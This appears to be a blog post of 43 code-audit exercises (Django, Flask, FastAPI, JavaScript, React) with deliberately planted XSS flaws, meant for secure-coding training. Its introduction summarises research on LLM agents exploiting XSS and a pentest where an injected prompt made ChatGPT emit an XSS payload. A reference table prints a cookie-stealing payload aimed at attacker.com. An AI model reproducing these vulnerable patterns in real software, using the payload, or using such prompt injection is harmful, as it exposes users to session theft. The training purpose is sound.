# 60 XSS Code Audit Cases: Can You Find Every Bug Before an LLM Does It For Them?

## LLMs Are Already Exploiting XSS. The Research Proves It.

No government or criminal organization has been publicly attributed with using an LLM to exploit XSS in the wild — yet. But the academic evidence that it is coming, and soon, is unambiguous.

In 2024, researchers at the University of Illinois gave a GPT-4 agent a list of real, publicly disclosed CVEs and told it to exploit them autonomously — no human guidance, no hints beyond the CVE description. GPT-4 achieved an **87% success rate**. Every other model they tested, and every open-source vulnerability scanner they ran, found zero. The researchers described this as an "emergent capability." One of GPT-4's only two failures was an XSS vulnerability — and it failed not because XSS was beyond it, but because the target application's JavaScript-heavy navigation made it hard for the agent to reach the vulnerable form field in the first place. The underlying exploit logic was not the obstacle.

The same research group then went further. They built teams of specialized LLM agents — including a dedicated XSS agent — and demonstrated that these agent teams could autonomously exploit **zero-day** XSS vulnerabilities in open-source CMS software (CVE-2024-27757, CVE-2024-34061) without being given any vulnerability description at all. The agents browsed the application, identified unescaped output, crafted payloads, and confirmed execution.

The closest real-world case so far comes from a commercial penetration test documented by security firm Vaadata in 2024. A company had integrated the ChatGPT API into a training platform. By crafting a description that caused ChatGPT's own output to contain a secondary malicious prompt, the pentesters got ChatGPT to emit a working XSS payload in a downstream response — exploiting an unsanitized output sink the developers had not considered an attack surface because it was driven by AI, not by user input directly.

That is the new attack surface: not just your input fields, but your AI's output fields.

XSS is not a new vulnerability class. It has been on the OWASP Top 10 since the list was first published. Every web security framework ships with autoescaping enabled by default. And yet it remains one of the most consistently discovered vulnerabilities in real-world penetration tests and bug bounty programs — and now, in autonomous LLM agent runs. The gap between "the framework protects you" and "this application is actually safe" is where real bugs live, and that gap is filled with misused APIs, wrong-context escaping, and misplaced sanitization logic.

The defences have not changed. But the speed and scale at which the other side can now find the holes has.

This blog post is a training set for your brain.

---

> 🔒 **These cases are part of [SecEng-Exercises](https://github.com/fosres/SecEng-Exercises)** — an open source repository of LeetCode-style secure coding challenges designed to help train both humans *and* AI models to write secure code. If this kind of challenge is useful to you, a ⭐ on GitHub helps the project reach more developers and security engineers. More challenges covering SQL injection, authentication flaws, API security, and cryptographic misuse are being added weekly.

---

## The Challenge

Below are **60 code audit cases**. Each presents a realistic web application snippet — Django, Flask, FastAPI, vanilla JavaScript, or React — containing zero, one, or two security bugs related to XSS.

For each case, your job is to do three things:

**1. Identify the XSS type (if any)**

- **Reflected XSS** — the payload comes from the current request (URL parameter, form field) and is reflected back in the same response
- **Stored XSS** — the payload is persisted (database, in-memory store) and rendered to a different user or a later request
- **DOM XSS** — the payload never touches the server; it is injected and executed entirely in client-side JavaScript
- **No XSS** — the code is functionally safe, but may have display issues worth noting

**2. Classify the escaping error**

- **Missing escaping** — no escaping of any kind is applied at the vulnerable output point
- **Wrong context escaping** — escaping is applied, but for the wrong output context (e.g. HTML escaping applied to a JavaScript string context)
- **Misplaced escaping** — escaping is applied in the right context but at the wrong layer (e.g. escaping at input/storage time instead of output/render time, then bypassed by a `| safe` filter downstream)

**3. Write the fix**

Edit the flawed code snippet so it contains no XSS vulnerabilities and no display issues. Your fix must not break the intended functionality of the code.

---

## Critical Reference Tables

Before you begin, study these tables. They will save you from the most common classification mistakes.

### Table 1: The Five Ways Autoescaping Gets Bypassed

Understanding why autoescaping fails is more important than memorising that it exists. Every major Python web framework ships with HTML autoescaping enabled by default for template variables. But all of them provide escape hatches — functions and filters that tell the template engine "I've already handled this, don't escape it." The bug in every case below is that the content has *not* actually been made safe before that trust is granted.

| Mechanism | Framework | What it Returns | What the Template Does |
|---|---|---|---|
| `Markup(x)` | Flask / Jinja2 | `Markup` object | Skips autoescaping — treats value as already safe HTML |
| `{{ x \| safe }}` | Jinja2 (Flask & FastAPI) | `Markup` object | Skips autoescaping — treats value as already safe HTML |
| `mark_safe(x)` | Django | `SafeData` object | Skips autoescaping — treats value as already safe HTML |
| `{% autoescape off %}` | Django | Disables check entirely | Skips autoescaping for **all** variables inside the block |
| `format_html(x)` (no `{}` args) | Django | `SafeString` object | Skips autoescaping — treats value as already safe HTML |

**Why this table matters:** Cases 53–59 all involve one of these five mechanisms. Without understanding this table, you will look at `{{ comment }}` in a template and think it is safe — because it has no `| safe` filter — without realising the value itself is already a `SafeString` from an upstream `format_html()` call. The vulnerability is invisible at the template layer if you do not trace the type of the value being rendered.

**Key principle:** Store raw strings. Escape at render time. Never mark a value as safe before you have escaped it.

---

### Table 2: JavaScript Context Escaping by Framework

HTML autoescaping converts `<` to `&lt;`, `>` to `&gt;`, `"` to `&quot;`, and so on. This is sufficient when a value is rendered in **HTML body context** — inside a `<p>`, `<div>`, `<h1>`, etc. It is **not** sufficient when a value is rendered inside a JavaScript string.

Consider: `var user = "{{ username }}";`

If `username` is `"; fetch('https://attacker.com?q='+document.cookie);//`, HTML escaping does nothing — the payload contains no HTML special characters. The `"` closes the JavaScript string, and the fetch executes.

| Framework | Template Filter | Notes |
|---|---|---|
| Django | `{{ value \| escapejs }}` | Django-specific. Backslash-escapes JS special characters. Does **not** add surrounding quotes. |
| Flask (Jinja2) | `{{ value \| tojson }}` | Outputs a JSON-encoded string **with** surrounding double quotes already included. Remove manual quotes from surrounding template. |
| FastAPI (Jinja2) | `{{ value \| tojson }}` | Same as Flask. `\| escapejs` is Django-only and will not work here. |

**Why this table matters:** Using `| escapejs` in a Flask template, or using `| tojson` in a Django template, is a wrong-context escaping mistake even though the intent is correct. Framework choice determines which filter to reach for.

---

### Table 3: Flask `request` Object — Which Attribute for Which Input Source

A common mistake in Flask is reading from the wrong attribute of the `request` object, which can mask where user-controlled input actually comes from. Understanding the source of each value is important for correctly scoping the attack surface.

| Attribute | Source | HTTP Method | Content-Type Required |
|---|---|---|---|
| `request.args` | URL query string | Any (GET is conventional) | None |
| `request.form` | POST body | POST | `application/x-www-form-urlencoded` or `multipart/form-data` |
| `request.get_json()` | POST/PUT/PATCH body | POST, PUT, PATCH | `application/json` |
| `request.data` | Raw body | Any non-form type | Any non-form Content-Type |
| `request.files` | POST body | POST | `multipart/form-data` |

**Why this table matters:** When classifying a case as Reflected vs Stored XSS, you need to know whether the input comes from the current request (`request.args`, `request.form`) or from a stored source (database, in-memory list). `request.args` almost always means GET and therefore Reflected XSS. `request.form` with a POST route storing to a database means Stored XSS.

---

### Table 4: Defense in Depth — Two Coordinated Fixes (Case 31)

Most XSS bugs require one fix at one layer. Case 31 is the exception: it requires **two coordinated fixes at different layers**. This case is highlighted explicitly because either fix alone leaves a residual vulnerability.

The pattern: a server-side template injects a value into a JavaScript string argument, which is then passed to a function that writes to an `innerHTML` DOM sink.

```html
<!-- Layer 1: JS string context in template -->
showBanner("{{ msg }}");

<!-- Layer 2: innerHTML DOM sink inside the function -->
function showBanner(msg) {
    document.getElementById("banner").innerHTML = "<p>Notification: " + msg + "</p>";
}
```

Fix Layer 1 alone (`| escapejs` on the template): An attacker who can store a value containing `<img src=x onerror=...>` will have it backslash-escaped in the JS string — but once `msg` arrives inside `showBanner()`, the DOM still parses it via `innerHTML`. Layer 2 is still vulnerable.

Fix Layer 2 alone (`textContent` in `showBanner()`): An attacker who can break out of the JS string via `");` will execute arbitrary code before `showBanner()` is ever called. Layer 1 is still vulnerable.

**Both fixes are required simultaneously.** This is defense in depth — neither layer alone closes the attack surface.

---

Now go to work.

---

## The 60 Cases

---

### Case 1

```python
# views.py
from django.shortcuts import render

def search(request):
    query = request.GET.get("q", "")
    results = []  # imagine DB results here
    return render(request, "results.html", {"query": query, "results": results})
```

```html
<!-- results.html -->
<html>
<body>
  <h2>Results for: {{ query | safe }}</h2>
  {% for result in results %}
    <p>{{ result.title }}</p>
  {% endfor %}
</body>
</html>
```

---

### Case 2

```python
# views.py
from django.shortcuts import render
from django.utils.html import escape

def user_profile(request):
    username = escape(request.GET.get("name", ""))
    return render(request, "profile.html", {"username": username})
```

```html
<!-- profile.html -->
<html>
<head>
  <script>
    var currentUser = "{{ username }}";
    console.log("Logged in as: " + currentUser);
  </script>
</head>
<body><h1>Profile</h1></body>
</html>
```

---

### Case 3

```python
# views.py
from django.shortcuts import render
from django.utils.html import escape
from django.utils.safestring import mark_safe

def comment_list(request):
    raw_comments = Comment.objects.values_list("body", flat=True)
    safe_comments = [mark_safe(escape(c)) for c in raw_comments]
    return render(request, "comments.html", {"comments": safe_comments})
```

```html
<!-- comments.html -->
<ul>
  {% for comment in comments %}
    <li>{{ comment }}</li>
  {% endfor %}
</ul>
```

---

### Case 4

```python
# app.py
from flask import Flask, request, render_template_string

app = Flask(__name__)

TEMPLATE = """
<html>
<body>
  <h1>Hello, %s!</h1>
</body>
</html>
"""

@app.route("/greet")
def greet():
    name = request.args.get("name", "guest")
    return render_template_string(TEMPLATE % name)
```

---

### Case 5

```python
# app.py
from flask import Flask, request, render_template_string
from urllib.parse import quote

app = Flask(__name__)

@app.route("/redirect-preview")
def redirect_preview():
    destination = request.args.get("to", "/")
    safe_dest = quote(destination, safe="/:?=&")
    return render_template_string("""
    <html>
    <body>
      <a href="{{ dest }}">Click here to continue</a>
    </body>
    </html>
    """, dest=safe_dest)
```

---

### Case 6

```python
# app.py
from flask import Flask, request, render_template
import html

app = Flask(__name__)

@app.route("/comment")
def comment():
    user_comment = request.args.get("comment", "")
    safe_comment = html.escape(user_comment)
    return render_template("comment.html", comment=safe_comment)
```

```html
<!-- templates/comment.html -->
<html>
<body>
  <p>Your comment: {{ comment }}</p>
</body>
</html>
```

---

### Case 7

```python
# main.py
from fastapi import FastAPI
from fastapi.responses import HTMLResponse

app = FastAPI()

@app.get("/search")
def search(q: str = ""):
    html = f"""
    <html>
    <body>
      <h2>Results for: {q}</h2>
    </body>
    </html>
    """
    return HTMLResponse(content=html)
```

---

### Case 8

```python
# main.py
from fastapi import FastAPI
from fastapi.responses import JSONResponse

app = FastAPI()

@app.get("/api/username")
def get_username(name: str = ""):
    return JSONResponse(content={"username": name})
```

```html
<!-- index.html (served separately) -->
<html>
<body>
  <div id="greeting"></div>
  <script>
    fetch("/api/username?name=" + location.search.split("name=")[1])
      .then(r => r.json())
      .then(data => {
        document.getElementById("greeting").innerHTML = "Hello, " + data.username;
      });
  </script>
</body>
</html>
```

---

### Case 9

```python
# main.py
from fastapi import FastAPI
from fastapi.responses import JSONResponse
import html

app = FastAPI()

@app.get("/api/comment")
def get_comment(text: str = ""):
    safe_text = html.escape(text)
    return JSONResponse(content={"comment": safe_text})
```

```javascript
// App.jsx (React frontend)
import { useEffect, useRef } from "react";

function CommentBox({ comment }) {
  const ref = useRef(null);

  useEffect(() => {
    ref.current.innerHTML = comment;
  }, [comment]);

  return <div ref={ref} />;
}

async function loadComment() {
  const params = new URLSearchParams(window.location.search);
  const res = await fetch("/api/comment?text=" + params.get("text"));
  const data = await res.json();
  return <CommentBox comment={data.comment} />;
}
```

---

### Case 10

```html
<!-- index.html -->
<html>
<body>
  <div id="username-display"></div>
  <div id="bio-display"></div>

  <script>
    const params = new URLSearchParams(window.location.search);

    const username = params.get("username") || "guest";
    const bio = params.get("bio") || "";

    document.getElementById("username-display").innerHTML = "User: " + username;
    document.getElementById("bio-display").innerHTML = "Bio: " + bio;
  </script>
</body>
</html>
```

---

### Case 11

```javascript
// hooks/useRichText.js
import { useEffect, useRef } from "react";

export function useRichText(content) {
  const ref = useRef(null);

  useEffect(() => {
    if (ref.current) {
      ref.current.innerHTML = content;
    }
  }, [content]);

  return ref;
}
```

```javascript
// App.jsx
import { useRichText } from "./hooks/useRichText";

function ReviewCard({ reviewText }) {
  const ref = useRichText(reviewText);
  return <div className="review" ref={ref} />;
}

async function loadReview() {
  const params = new URLSearchParams(window.location.search);
  const reviewText = params.get("review") || "";
  return <ReviewCard reviewText={reviewText} />;
}
```

---

### Case 12

```html
<!-- index.html -->
<html>
<body>
  <div id="search-banner"></div>

  <script>
    function renderBanner(container, label, value) {
      const encoded = encodeURIComponent(value);
      container.innerHTML = "<p>" + label + ": " + encoded + "</p>";
    }

    const params = new URLSearchParams(window.location.search);
    const query = params.get("q") || "";

    renderBanner(
      document.getElementById("search-banner"),
      "You searched for",
      query
    );
  </script>
</body>
</html>
```

---

### Case 13

```python
# views.py
from django.shortcuts import render
from myapp.models import Announcement

def announcements(request):
    items = Announcement.objects.values_list("body", flat=True)
    return render(request, "announcements.html", {"items": items})
```

```html
<!-- announcements.html -->
<html>
<body>
  <h2>Latest Announcements</h2>
  <ul>
    {% autoescape off %}
      {% for item in items %}
        <li>{{ item }}</li>
      {% endfor %}
    {% endautoescape %}
  </ul>
</body>
</html>
```

---

### Case 14

```python
# app.py
from flask import Flask, request, render_template
from markupsafe import Markup

app = Flask(__name__)

@app.route("/welcome")
def welcome():
    username = request.args.get("name", "guest")
    greeting = Markup("Welcome, %s!" % username)
    return render_template("welcome.html", greeting=greeting)
```

```html
<!-- templates/welcome.html -->
<html>
<body>
  <p>{{ greeting }}</p>
</body>
</html>
```

---

### Case 15

```python
# main.py
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates

app = FastAPI()
templates = Jinja2Templates(directory="templates")

@app.get("/dashboard")
def dashboard(request: Request, username: str = "guest"):
    user_data = {"name": username, "role": "viewer"}
    return templates.TemplateResponse(
        "dashboard.html", {"request": request, "user_data": user_data}
    )
```

```html
<!-- templates/dashboard.html -->
<html>
<body>
  <h1>Dashboard</h1>
  <script>
    var userData = {{ user_data }};
    console.log("Logged in as:", userData.name);
  </script>
</body>
</html>
```

---

### Case 16

```python
# views.py
from django.shortcuts import render

def profile(request):
    css_class = request.GET.get("theme", "default")
    return render(request, "profile.html", {"css_class": css_class})
```

```html
<!-- profile.html -->
<html>
<body>
  <div class={{ css_class }}>
    <p>Welcome to your profile.</p>
  </div>
</body>
</html>
```

---

### Case 17

```python
# app.py
from flask import Flask, request, render_template
from markupsafe import escape

app = Flask(__name__)

comments = []

@app.route("/comment", methods=["POST"])
def add_comment():
    body = request.form.get("body", "")
    comments.append(str(escape(body)))
    return "Comment saved.", 200

@app.route("/comments")
def view_comments():
    return render_template("comments.html", comments=comments)
```

```html
<!-- templates/comments.html -->
<html>
<body>
  <h2>Comments</h2>
  <ul>
    {% for comment in comments %}
      <li>{{ comment | safe }}</li>
    {% endfor %}
  </ul>
</body>
</html>
```

---

### Case 18

```html
<!DOCTYPE html>
<html>
<body>
  <h1>Product Search</h1>
  <div id="results"></div>

  <script>
    const query = decodeURIComponent(window.location.hash.substring(1));

    document.getElementById("results").innerHTML =
      "You searched for: <strong>" + query + "</strong>";
  </script>
</body>
</html>
```

---

### Case 19

```javascript
// components/Bio.jsx
function Bio({ username }) {
  const [bio, setBio] = React.useState("");
  const bioRef = React.useRef(null);

  React.useEffect(() => {
    fetch(`/api/users/${username}/bio`)
      .then(res => res.json())
      .then(data => setBio(data.bio));
  }, [username]);

  React.useEffect(() => {
    if (bioRef.current) {
      bioRef.current.innerHTML = bio;
    }
  }, [bio]);

  return (
    <div>
      <h2>About {username}</h2>
      <div ref={bioRef} />
    </div>
  );
}
```

---

### Case 20

```python
# app.py
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/redirect")
def redirect_user():
    destination = request.args.get("dest", "/home")
    return render_template("redirect.html", destination=destination)
```

```html
<!-- templates/redirect.html -->
<html>
<body>
  <p>Click below to continue:</p>
  <a href="{{ destination }}">Continue</a>
</body>
</html>
```

---

### Case 21

```html
<!DOCTYPE html>
<html>
<body>
  <h1>Notifications</h1>
  <div id="notification-bar"></div>

  <script>
    window.addEventListener("message", function(event) {
      const msg = event.data;
      document.getElementById("notification-bar").innerHTML =
        "<p>New message: " + msg + "</p>";
    });
  </script>
</body>
</html>
```

---

### Case 22

```python
# views.py
from django.shortcuts import render
from django.utils.html import format_html

def user_badge(request):
    username = request.GET.get("user", "guest")
    role = request.GET.get("role", "viewer")
    badge = format_html(
        "<span class='badge'>{}</span> logged in as " + username,
        role
    )
    return render(request, "badge.html", {"badge": badge})
```

```html
<!-- badge.html -->
<html>
<body>
    <div id="header">
        {{ badge | safe }}
    </div>
</body>
</html>
```

---

### Case 23

```python
# main.py
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates
from markupsafe import escape

app = FastAPI()
templates = Jinja2Templates(directory="templates")

reviews = []

@app.post("/review")
async def add_review(request: Request):
    body = await request.json()
    clean = str(escape(body.get("text", "")))
    reviews.append(clean)
    return {"status": "saved"}

@app.get("/reviews")
async def view_reviews(request: Request):
    return templates.TemplateResponse(
        "reviews.html", {"request": request, "reviews": reviews}
    )
```

```html
<!-- templates/reviews.html -->
<html>
<body>
    <h2>Customer Reviews</h2>
    <ul>
        {% for review in reviews %}
            <li>{{ review | safe }}</li>
        {% endfor %}
    </ul>
</body>
</html>
```

---

### Case 24

```python
# views.py
from django.shortcuts import render
from django.utils.html import mark_safe

def search(request):
    query = request.GET.get("q", "")
    safe_query = mark_safe(query)
    return render(request, "search.html", {"query": safe_query})
```

```html
<!-- search.html -->
<html>
<body>
    <h1>Search</h1>
    <form method="GET" action="/search">
        <input type="text" name="q" value="{{ query }}">
        <button type="submit">Search</button>
    </form>
</body>
</html>
```

---

### Case 25

```html
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <h1>Welcome</h1>
    <div id="content">Loading your page...</div>

    <script>
        const params = new URLSearchParams(window.location.search);
        const page = params.get("page") || "Home";

        document.title = page;
        document.getElementById("content").innerHTML =
            "<h2>You are viewing: " + page + "</h2>";
    </script>
</body>
</html>
```

---

### Case 26

```python
# app.py
from flask import Flask, request, render_template
from markupsafe import escape

app = Flask(__name__)

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username", "")
    password = request.form.get("password", "")

    if not username or not password:
        error = escape("Error: username and password are required.")
        return render_template("login.html", error=error)

    if username != "admin" or password != "secret":
        error = escape(f"Error: invalid credentials for user '{username}'.")
        return render_template("login.html", error=error)

    return "Welcome!"
```

```html
<!-- templates/login.html -->
<html>
<body>
    <form method="POST" action="/login">
        <input type="text" name="username" placeholder="Username">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Login</button>
    </form>
    {% if error %}
        <script>
            alert("{{ error }}");
        </script>
    {% endif %}
</body>
</html>
```

---

### Case 27

```python
# views.py
from django.shortcuts import render
from django.utils.html import format_html, mark_safe

def search_results(request):
    query = request.GET.get("q", "")
    results = ["Result 1", "Result 2", "Result 3"]

    items_html = ""
    for result in results:
        items_html += format_html("<li>{}</li>", result)

    summary = mark_safe(f"<p>Showing results for: <strong>{query}</strong></p>")

    return render(request, "results.html", {
        "summary": summary,
        "items_html": mark_safe(items_html),
    })
```

```html
<!-- results.html -->
<html>
<body>
    <h1>Search Results</h1>
    {{ summary }}
    <ul>
        {{ items_html }}
    </ul>
</body>
</html>
```

---

### Case 28

```python
# main.py
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates
from markupsafe import escape

app = FastAPI()
templates = Jinja2Templates(directory="templates")

@app.get("/profile")
def profile(request: Request, username: str = "guest", theme: str = "light"):
    safe_username = str(escape(username))
    return templates.TemplateResponse("profile.html", {
        "request": request,
        "username": safe_username,
        "theme": theme,
    })
```

```html
<!-- templates/profile.html -->
<html>
<body>
    <div class={{ theme }}>
        <h1>Welcome, {{ username }}!</h1>
        <p>Your profile is loading...</p>
    </div>
</body>
</html>
```

---

### Case 29

```html
<!DOCTYPE html>
<html>
<head>
    <title>Support Chat</title>
</head>
<body>
    <h1>Live Support</h1>
    <div id="chat-log"></div>
    <input type="text" id="msg-input" placeholder="Type a message...">
    <button onclick="sendMessage()">Send</button>

    <script>
        const chatLog = document.getElementById("chat-log");

        function sendMessage() {
            const input = document.getElementById("msg-input");
            const msg = input.value;

            const encoded = encodeURIComponent(msg);
            chatLog.innerHTML += "<p><strong>You:</strong> " + encoded + "</p>";
            input.value = "";
        }
    </script>
</body>
</html>
```

---

### Case 30

```javascript
// components/CommentFeed.jsx
function CommentFeed() {
    const [comments, setComments] = React.useState([]);
    const [input, setInput] = React.useState("");

    function addComment() {
        setComments([...comments, input]);
        setInput("");
    }

    return (
        <div>
            <h2>Comments</h2>
            <input
                type="text"
                value={input}
                onChange={e => setInput(e.target.value)}
            />
            <button onClick={addComment}>Post</button>
            <ul>
                {comments.map((comment, i) => (
                    <li
                        key={i}
                        ref={el => el && (el.innerHTML = comment)}
                    />
                ))}
            </ul>
        </div>
    );
}
```

---

### Case 31

```python
# views.py
from django.shortcuts import render

def dashboard(request):
    msg = request.GET.get("msg", "")
    return render(request, "dashboard.html", {"msg": msg})
```

```html
<!-- dashboard.html -->
<html>
<head>
    <script>
        function showBanner(msg) {
            document.getElementById("banner").innerHTML =
                "<p>Notification: " + msg + "</p>";
        }
    </script>
</head>
<body>
    <div id="banner"></div>
    <h1>Dashboard</h1>
    <script>
        showBanner("{{ msg }}");
    </script>
</body>
</html>
```

> **Note:** This is the one case in the set requiring two coordinated fixes at different layers. See Table 4 above.

---

### Case 32

```python
# main.py
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse

app = FastAPI()

@app.get("/settings", response_class=HTMLResponse)
def settings(request: Request, lang: str = "en"):
    return f"""
    <html>
    <body>
        <h1>Settings</h1>
        <p>Your language preference: {lang}</p>
        <p>Visit our <a href="/help?lang={lang}">help page</a>.</p>
    </body>
    </html>
    """
```

---

### Case 33

```python
# app.py
from flask import Flask, request, jsonify
from markupsafe import escape

app = Flask(__name__)

activity_feed = []

@app.route("/activity", methods=["POST"])
def add_activity():
    data = request.get_json()
    action = str(escape(data.get("action", "")))
    activity_feed.append(action)
    return jsonify({"status": "saved"})

@app.route("/feed")
def feed():
    return jsonify({"feed": activity_feed})
```

```html
<!-- feed.html (served separately as a static file) -->
<!DOCTYPE html>
<html>
<body>
    <h1>Activity Feed</h1>
    <div id="feed"></div>

    <script>
        fetch("/feed")
            .then(res => res.json())
            .then(data => {
                data.feed.forEach(item => {
                    document.getElementById("feed").innerHTML += "<p>" + item + "</p>";
                });
            });
    </script>
</body>
</html>
```

---

### Case 34

```python
# views.py
from django.http import HttpResponse
from django.utils.html import format_html
from .models import Report

def search(request):
    query = request.GET.get("q", "")
    results = Report.objects.filter(title__icontains=query)

    items_html = ""
    for r in results:
        items_html += format_html("<li>{}</li>", r.title)

    html = format_html(
        "<h2>Results for: {}</h2><ul>{}</ul>",
        query,
        items_html
    )
    return HttpResponse(html)
```

---

### Case 35

```html
<!DOCTYPE html>
<html>
<body>
    <h1>Product Search</h1>
    <input type="text" id="search" placeholder="Search products..." />
    <ul id="suggestions"></ul>

    <script>
        const input = document.getElementById("search");
        const suggestions = document.getElementById("suggestions");

        input.addEventListener("input", () => {
            const query = input.value;

            fetch(`/api/suggestions?q=${query}`)
                .then(res => res.json())
                .then(data => {
                    suggestions.innerHTML = "";
                    data.results.forEach(item => {
                        suggestions.insertAdjacentHTML(
                            "beforeend",
                            `<li class="suggestion">${item.name}</li>`
                        );
                    });
                });
        });
    </script>
</body>
</html>
```

---

### Case 36

```javascript
// ProfilePage.jsx
import { useEffect, useRef, useState } from "react";

export default function ProfilePage({ userId }) {
    const [profile, setProfile] = useState(null);
    const bioRef = useRef(null);

    useEffect(() => {
        fetch(`/api/profile/${userId}`)
            .then(res => res.json())
            .then(data => setProfile(data));
    }, [userId]);

    useEffect(() => {
        if (profile && bioRef.current) {
            bioRef.current.innerHTML = profile.bio;
        }
    }, [profile]);

    if (!profile) return <p>Loading...</p>;

    return (
        <div className="profile">
            <h1>{profile.displayName}</h1>
            <p>Member since: {profile.joinDate}</p>
            <div className="bio-section" ref={bioRef} />
        </div>
    );
}
```

---

### Case 37

```python
# app.py
from flask import Flask, request, render_template

app = Flask(__name__)

tickets = []

@app.route("/ticket", methods=["POST"])
def submit_ticket():
    title = request.form.get("title", "")
    body = request.form.get("body", "")
    tickets.append({"title": title, "body": body})
    return "Ticket submitted."

@app.route("/tickets")
def view_tickets():
    return render_template("tickets.html", tickets=tickets)
```

```html
<!-- tickets.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>Support Tickets</h1>
    {% for ticket in tickets %}
        <div class="ticket">
            <h2>{{ ticket.title }}</h2>
            <div class="body">{% autoescape off %}{{ ticket.body }}{% endautoescape %}</div>
        </div>
    {% endfor %}
</body>
</html>
```

---

### Case 38

```python
# views.py
from django.shortcuts import render
from django.utils.html import escape

def preferences(request):
    saved = False
    email = request.POST.get("email", "")

    if request.method == "POST":
        saved = True

    return render(request, "preferences.html", {
        "email": escape(email),
        "saved": saved,
    })
```

```html
<!-- preferences.html -->
<!DOCTYPE html>
<html>
<head>
    <script>
        function showConfirmation(email) {
            const banner = document.getElementById("confirmation");
            banner.innerHTML = "Preferences saved for: " + email;
        }
    </script>
</head>
<body>
    <h1>Notification Preferences</h1>
    <form method="POST">
        <input type="text" name="email" placeholder="Email address" />
        <button type="submit">Save</button>
    </form>
    {% if saved %}
        <div id="confirmation"></div>
        <script>
            showConfirmation("{{ email }}");
        </script>
    {% endif %}
</body>
</html>
```

---

### Case 39

```python
# main.py
import sqlite3
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from markupsafe import escape

app = FastAPI()

def get_db():
    conn = sqlite3.connect("comments.db")
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute("""
        CREATE TABLE IF NOT EXISTS comments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            author TEXT NOT NULL,
            text TEXT NOT NULL
        )
    """)
    conn.commit()
    conn.close()

init_db()

@app.post("/comment")
async def add_comment(request: Request):
    data = await request.json()
    author = str(escape(data.get("author", "")))
    text = str(escape(data.get("text", "")))
    conn = get_db()
    conn.execute(
        "INSERT INTO comments (author, text) VALUES (?, ?)",
        (author, text)
    )
    conn.commit()
    conn.close()
    return {"status": "saved"}

@app.get("/comments", response_class=HTMLResponse)
async def view_comments():
    conn = get_db()
    rows_data = conn.execute("SELECT author, text FROM comments").fetchall()
    conn.close()

    rows = ""
    for c in rows_data:
        rows += f"<tr><td>{c['author']}</td><td>{c['text']}</td></tr>"

    return f"""
    <!DOCTYPE html>
    <html>
    <body>
        <h1>Comments</h1>
        <table>
            <thead><tr><th>Author</th><th>Comment</th></tr></thead>
            <tbody>{rows}</tbody>
        </table>
    </body>
    </html>
    """
```

---

### Case 40

```python
# app.py
import sqlite3
from flask import Flask, request, render_template

app = Flask(__name__)

def get_db():
    conn = sqlite3.connect("reviews.db")
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute("""
        CREATE TABLE IF NOT EXISTS reviews (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            review TEXT NOT NULL
        )
    """)
    conn.commit()
    conn.close()

init_db()

@app.route("/review", methods=["POST"])
def submit_review():
    username = request.form.get("username", "")
    review = request.form.get("review", "")
    conn = get_db()
    conn.execute(
        "INSERT INTO reviews (username, review) VALUES (?, ?)",
        (username, review)
    )
    conn.commit()
    conn.close()
    return "Review submitted."

@app.route("/reviews")
def view_reviews():
    conn = get_db()
    rows = conn.execute("SELECT username, review FROM reviews").fetchall()
    conn.close()
    return render_template("reviews.html", reviews=rows)
```

```html
<!-- reviews.html -->
<!DOCTYPE html>
<html>
<head>
    <script>
        function highlightUser(username) {
            document.getElementById("welcome").innerHTML =
                "Welcome back, " + username + "!";
        }
    </script>
</head>
<body>
    <div id="welcome"></div>
    <h1>Product Reviews</h1>
    {% for review in reviews %}
        <div class="review">
            <strong>{{ review.username }}</strong>
            <p>{{ review.review }}</p>
            <script>highlightUser("{{ review.username }}");</script>
        </div>
    {% endfor %}
</body>
</html>
```

---

### Case 41

```python
# views.py
import sqlite3
from django.shortcuts import render

def get_db():
    conn = sqlite3.connect("users.db")
    conn.row_factory = sqlite3.Row
    return conn

def profile(request, username):
    conn = get_db()
    row = conn.execute(
        "SELECT username, bio FROM users WHERE username = ?", (username,)
    ).fetchone()
    conn.close()
    return render(request, "profile.html", {"user": row})
```

```html
<!-- profile.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>{{ user.username }}'s Profile</h1>
    <div class="bio">{{ user.bio | safe }}</div>
</body>
</html>
```

---

### Case 42

```python
# app.py
import sqlite3
from flask import Flask, request, render_template
from markupsafe import escape

app = Flask(__name__)

def get_db():
    conn = sqlite3.connect("events.db")
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute("""
        CREATE TABLE IF NOT EXISTS events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            title TEXT NOT NULL,
            description TEXT NOT NULL
        )
    """)
    conn.commit()
    conn.close()

init_db()

@app.route("/event", methods=["POST"])
def add_event():
    title = escape(request.form.get("title", ""))
    description = escape(request.form.get("description", ""))
    conn = get_db()
    conn.execute(
        "INSERT INTO events (title, description) VALUES (?, ?)",
        (str(title), str(description))
    )
    conn.commit()
    conn.close()
    return "Event added."

@app.route("/events")
def view_events():
    conn = get_db()
    events = conn.execute("SELECT title, description FROM events").fetchall()
    conn.close()
    return render_template("events.html", events=events)
```

```html
<!-- events.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>Upcoming Events</h1>
    {% for event in events %}
        <div class="event">
            <h2>{{ event.title }}</h2>
            <p>{{ event.description }}</p>
        </div>
    {% endfor %}
</body>
</html>
```

---

### Case 43

```python
# views.py
import sqlite3
from django.shortcuts import render

def get_db():
    conn = sqlite3.connect("forum.db")
    conn.row_factory = sqlite3.Row
    return conn

def forum(request):
    if request.method == "POST":
        author = request.POST.get("author", "")
        body = request.POST.get("body", "")
        conn = get_db()
        conn.execute(
            "INSERT INTO posts (author, body) VALUES (?, ?)",
            (author, body)
        )
        conn.commit()
        conn.close()

    conn = get_db()
    posts = conn.execute("SELECT author, body FROM posts").fetchall()
    conn.close()
    return render(request, "forum.html", {"posts": posts})
```

```html
<!-- forum.html -->
